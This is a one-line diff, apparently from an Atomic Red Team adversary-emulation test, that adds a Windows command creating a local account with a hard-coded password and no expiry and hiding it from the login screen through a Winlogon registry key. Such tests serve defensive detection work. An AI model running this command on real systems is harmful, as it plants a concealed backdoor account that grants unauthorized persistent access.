@@ -1,0 +1,1 @@
+NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0
